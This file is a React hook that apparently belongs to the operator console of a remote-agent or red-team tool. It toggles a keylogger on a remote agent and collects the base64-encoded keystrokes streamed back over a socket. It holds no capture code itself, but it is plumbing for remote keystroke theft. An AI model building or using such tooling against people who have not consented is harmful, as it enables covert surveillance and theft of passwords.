import { useCallback, useEffect, useRef, useState } from 'react'
import type { Socket } from 'socket.io-client'

import { toggleKeylogger } from '@/service/agent-service.ts'

interface AgentKeyloggerPayload {
  agent_id: string
  data: string
}

export function useAgentKeylogger(
  socket: Socket,
  auditId: string,
  agentId: string
) {
  const [isRunning, setIsRunning] = useState(false)
  const [output, setOutput] = useState('')
  const outputRef = useRef<HTMLPreElement | null>(null)

  useEffect(() => {
    const handleKeylogger = (payload: AgentKeyloggerPayload) => {
      if (payload.agent_id !== agentId) return
      const decoded = atob(payload.data)
      setOutput(prev => prev + decoded)
    }

    socket.on('agent:keylogger', handleKeylogger)

    return () => {
      socket.off('agent:keylogger', handleKeylogger)
    }
  }, [socket, agentId])

  const start = useCallback(async () => {
    await toggleKeylogger(auditId, agentId, 'start')
    setIsRunning(true)
  }, [auditId, agentId])

  const stop = useCallback(async () => {
    await toggleKeylogger(auditId, agentId, 'stop')
    setIsRunning(false)
  }, [auditId, agentId])

  const clearOutput = useCallback(() => {
    setOutput('')
  }, [])

  return { isRunning, output, outputRef, start, stop, clearOutput }
}
